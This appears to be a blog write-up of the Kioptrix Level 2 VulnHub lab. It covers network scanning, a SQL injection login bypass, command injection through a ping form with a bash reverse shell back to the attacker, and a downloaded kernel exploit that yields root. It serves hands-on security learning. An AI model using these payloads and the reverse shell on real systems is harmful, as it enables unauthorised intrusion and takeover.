---
layout: post
title:  Kioptrix Level 2 Writeup
categories: [vulnhub]
tags: [Writeup]
---


# Objective

Get root access via any means.

# Enumeration

Find the target ip:

```bash
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:ad:36:56, IPv4: 10.10.10.129
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:ed:49:99       VMware, Inc.
10.10.10.133    00:0c:29:50:1f:1f       VMware, Inc.
10.10.10.254    00:50:56:e5:1b:02       VMware, Inc.
```

The target ip is 10.10.10.133.

Detect ports, services and some known vulnerabilities:

```bash
# Nmap 7.91 scan initiated Fri Nov  4 06:58:51 2022 as: nmap -A -p 1-1100 -oN nmap_result.txt 10.10.10.133
Nmap scan report for 10.10.10.133
Host is up (0.0020s latency).
Not shown: 1094 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp  open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            752/udp   status
|_  100024  1            755/tcp   status
443/tcp open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2022-11-04T06:35:42+00:00; -4h23m24s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
631/tcp open  ipp      CUPS 1.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
755/tcp open  status   1 (RPC #100024)

Host script results:
|_clock-skew: -4h23m24s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  4 06:59:06 2022 -- 1 IP address (1 host up) scanned in 14.75 seconds
```

Since it has port 80 open, so next I will try opening its web pages.

# Exploitation

![](/img/posts/kioptrix-level-2-writeup-1.jpg)

There's a login form. So the first thing came to my mind is sql injection.

I tried several sql commands to make a quick test.
I tried the following for both username and password:

admin'

admin'--

admin' or '1' = '1

And luckily the last one worked! I logged in successfully:
![](/img/posts/kioptrix-level-2-writeup-2.jpg)

Now there's another web page:
![](/img/posts/kioptrix-level-2-writeup-3.jpg)

It tells me I can execute ping tests. Usually this might have command injection vulnerabilities.
To verify my hypothesis, I added ls command after ping:
![](/img/posts/kioptrix-level-2-writeup-4.jpg)

which apparently worked:
![](/img/posts/kioptrix-level-2-writeup-5.jpg)
The directory content is listed after ping.
So next I tried to inject a bash reverse shell instead of ls command.
But before that, I should start a listener:
![](/img/posts/kioptrix-level-2-writeup-6.jpg)

Now it's time to start injecting bash shell:
![](/img/posts/kioptrix-level-2-writeup-7.jpg)

The full command is below:
```bash
127.0.0.1 & bash -i >& /dev/tcp/10.10.10.129/4444 0>&1
```

OK, I'm in.
![](/img/posts/kioptrix-level-2-writeup-8.jpg)

But I'm user apache, not root. So I need to do a privilege escalation.
I'm trying looking for its kernel vulnerabilities first.
Got its kernel version and type:
![](/img/posts/kioptrix-level-2-writeup-9.jpg)

![](/img/posts/kioptrix-level-2-writeup-10.jpg)

Searching for vulnerabilities via searchsploit:
```bash
──(kali㉿kali)-[~/kioptrix_lv2]
└─$ searchsploit Linux Kernel escalation
```
In the output below, I'm going to use the payload 9574.txt:
![](/img/posts/kioptrix-level-2-writeup-11.jpg)

```bash
┌──(kali㉿kali)-[~/kioptrix_lv2]
└─$ searchsploit -m linux/local/9574.txt                                                     1 ⨯
  Exploit: Linux Kernel < 2.6.19 (x86/x64) - 'udp_sendmsg' Local Privilege Escalation (2)
      URL: https://www.exploit-db.com/exploits/9574
     Path: /usr/share/exploitdb/exploits/linux/local/9574.txt
File Type: ASCII text, with CRLF line terminators

Copied to: /home/kali/kioptrix_lv2/9574.txt
```

In the content of the txt file, it leads me to another file which I think maybe the real payload script:
![](/img/posts/kioptrix-level-2-writeup-13.jpg)

After having downloaded the compressed file, I start an http server on the kali linux for sharing the file:
```bash
┌──(kali㉿kali)-[~/kioptrix_lv2]
└─$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

On the victim VM, downloading the file and decompress it:
```bash
bash-3.00$ wget http://10.10.10.129:8000/9574.tgz
--05:26:16--  http://10.10.10.129:8000/9574.tgz
           => `9574.tgz'
Connecting to 10.10.10.129:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4,359 (4.3K) [application/x-gtar-compressed]

    0K ....                                                  100%  415.71 MB/s

05:26:16 (415.71 MB/s) - `9574.tgz' saved [4359/4359]
bash-3.00$ tar zxvf 9574.tgz
therebel/
therebel/exploit.c
therebel/pwnkernel.c
therebel/therebel.sh
```

So there comes a subdirectory named therebel. 
Switch into it and run therebel.sh:
```bash
bash-3.00$ cd therebel  
bash-3.00$ ls -l
total 20
-rw-r--r--  1 apache apache 9922 Sep  2  2009 exploit.c
-rw-r--r--  1 apache apache  782 Sep  2  2009 pwnkernel.c
-rwxr--r--  1 apache apache 1471 Sep  2  2009 therebel.sh
bash-3.00$ ./therebel.sh
sh: no job control in this shell
sh-3.00# whoami
root
sh-3.00# 
```
Alright, well done!
